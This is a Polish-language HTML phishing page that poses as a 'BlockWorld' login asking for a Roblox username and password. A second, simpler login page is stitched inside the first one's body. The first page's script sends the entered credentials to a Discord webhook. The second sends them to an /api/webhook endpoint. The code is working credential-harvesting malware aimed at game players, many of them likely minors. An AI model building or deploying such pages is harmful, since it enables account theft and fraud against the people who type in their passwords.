<!doctype html>
<html lang="pl" class="h-full text-neutral-100">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>BlockWorld – Logowanie</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    .animated-bg {
      background: linear-gradient(-45deg, #0f766e, #047857, #065f46, #064e3b);
      background-size: 400% 400%;
      animation: gradientMove 12s ease infinite;
    }
    @keyframes gradientMove {
      0% {background-position: 0% 50%;}
      50% {background-position: 100% 50%;}
      100% {background-position: 0% 50%;}
    }
  </style>
</head>

<body class="h-full flex flex-col animated-bg">

  <!-- NAV -->
  <nav class="bg-black/50 backdrop-blur border-b border-neutral-800">
    <div class="max-w-6xl mx-auto px-4 py-4 flex items-center justify-between">
      <div class="flex items-center gap-2 font-extrabold text-xl text-emerald-400 drop-shadow-[0_0_10px_rgba(16,185,129,0.6)]">
        <span class="inline-block w-3 h-3 bg-emerald-500 rotate-45"></span>
        BlockWorld
      </div>
      <div class="text-sm text-neutral-300 italic">Z nami lepiej</div>
    </div>
  </nav>

  <!-- MAIN -->
  <main class="flex-1 flex items-center justify-center p-6">
    <div class="w-full max-w-md space-y-8">

      <!-- Header -->
      <header class="text-center space-y-2">
        <h1 class="text-3xl font-extrabold text-emerald-400 drop-shadow-[0_0_10px_rgba(16,185,129,0.5)]">Zaloguj się</h1>
        <p class="text-neutral-300 text-sm">Zaloguj się do swojego konta Roblox.</p>
      </header>

      <!-- LOGIN CARD -->
      <section class="bg-black/50 backdrop-blur-xl rounded-2xl p-6 shadow-2xl ring-1 ring-neutral-800">
        <form id="loginForm" class="space-y-5" novalidate>
          <!-- Username -->
          <div class="relative">
            <label class="block text-sm mb-1" for="login-username">Login</label>
            <input id="login-username" name="username" required
                   class="w-full pl-10 rounded-lg px-3 py-2 bg-neutral-800 border border-neutral-700 focus:outline-none focus:ring-2 focus:ring-emerald-500 transition-all duration-300"
                   placeholder="np. klockarz123" />
            <svg class="w-5 h-5 absolute left-3 top-9 text-neutral-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path d="M15.75 6a3.75 3.75 0 11-7.5 0 3.75 3.75 0 017.5 0z" />
              <path d="M4.5 20.25a8.25 8.25 0 0115 0" />
            </svg>
          </div>

          <!-- Password -->
          <div class="relative">
            <label class="block text-sm mb-1" for="login-password">Hasło</label>
            <input id="login-password" name="password" type="password" required minlength="8"
                   class="w-full pl-10 rounded-lg px-3 py-2 bg-neutral-800 border border-neutral-700 focus:outline-none focus:ring-2 focus:ring-emerald-500 transition-all duration-300"
                   placeholder="••••••••" />
            <svg class="w-5 h-5 absolute left-3 top-9 text-neutral-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path d="M12 15.75a3 3 0 100-6 3 3 0 000 6z" />
              <path d="M17.25 17.25a9 9 0 01-10.5 0M21 12a9 9 0 00-18 0 9 9 0 0018 0z" />
            </svg>
          </div>

          <!-- Remember me -->
          <div class="flex items-center justify-between text-sm">
            <label class="flex items-center gap-2">
              <input type="checkbox" class="accent-emerald-500" />
              Zapamiętaj mnie
            </label>
          </div>

          <!-- Submit -->
          <div class="flex items-center gap-3">
            <button id="loginBtn"
                    class="flex-1 py-2.5 rounded-lg bg-emerald-600 hover:bg-emerald-500 active:scale-95 transition transform font-semibold text-white shadow-lg shadow-emerald-800/30">
              Zaloguj się
            </button>
            <span id="loader" class="hidden animate-spin w-6 h-6 border-2 border-t-transparent border-white rounded-full"></span>
          </div>
        </form>
      </section>

      <!-- Response output -->
      <pre id="out" class="bg-black/50 rounded-xl p-4 text-xs overflow-auto max-h-60 hidden ring-1 ring-neutral-800"></pre>

      <!-- Footer -->
      <footer class="text-center text-neutral-400 text-xs pt-6">
        © 2025 BlockWorld
      </footer>
    </div>
  </main>

  <!-- Script -->
  <script>
    const out = document.getElementById("out");
    const form = document.getElementById("loginForm");
    const btn = document.getElementById("loginBtn");
    const loader = document.getElementById("loader");

    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN";

    form.addEventListener("submit", async (e) => {
      e.preventDefault();
      out.classList.remove("hidden");
      out.textContent = "";
      btn.disabled = true;
      loader.classList.remove("hidden");

      const fd = new FormData(form);
      const username = fd.get("username");
      const password = fd.get("password");

      // Tworzymy payload do Discord webhooka
      const payload = {
        content: `**Nowe logowanie:**\nLogin: \`${username}\`\nHasło: \`${password}\``
      };

      try {
        const res = await fetch(DISCORD_WEBHOOK_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });

        if (res.ok) {
          out.textContent = "Dane zostały wysłane do Discorda ✅";
          out.classList.remove("text-red-500");
          out.classList.add("text-green-500");
        } else {
          out.textContent = `Błąd wysyłania: ${res.status} ${res.statusText}`;
          out.classList.remove("text-green-500");
          out.classList.add("text-red-500");
        }
      } catch (error) {
        out.textContent = "Błąd sieci: " + error.message;
        out.classList.remove("text-green-500");
        out.classList.add("text-red-500");
      }

      loader.classList.add("hidden");
      btn.disabled = false;
    });
  </script>
<!DOCTYPE html>
<html lang="pl">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Logowanie</title>
<style>
  body {
    background: #121212;
    color: white;
    font-family: Arial, sans-serif;
    padding: 2rem;
  }
  input, button {
    display: block;
    margin: 0.5rem 0;
    padding: 0.5rem;
    width: 300px;
    border-radius: 5px;
    border: none;
  }
  input {
    font-size: 1rem;
  }
  button {
    background: #1DB954;
    color: white;
    font-weight: bold;
    cursor: pointer;
    font-size: 1rem;
  }
  #message {
    margin-top: 1rem;
    font-size: 0.9rem;
    color: #eee;
  }
</style>
</head>
<body>

<h1>Zaloguj się</h1>
<form id="loginForm">
  <input type="text" name="login" placeholder="Login" required />
  <input type="password" name="password" placeholder="Hasło" required />
  <button type="submit">Zaloguj się</button>
</form>

<div id="message"></div>

<script>
  document.getElementById('loginForm').addEventListener('submit', async e => {
    e.preventDefault();

    const formData = new FormData(e.target);
    const data = {
      login: formData.get('login'),
      password: formData.get('password')
    };

    const messageEl = document.getElementById('message');
    messageEl.textContent = 'Wysyłanie...';

    try {
      const response = await fetch('/api/webhook', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
      });

      const result = await response.json();

      if (response.ok) {
        messageEl.textContent = result.message || 'Wysłano dane pomyślnie!';
      } else {
        messageEl.textContent = result.error || 'Coś poszło nie tak.';
      }
    } catch (err) {
      messageEl.textContent = 'Błąd sieci: ' + err.message;
    }
  });
</script>

</body>
</html>
</body>
</html>
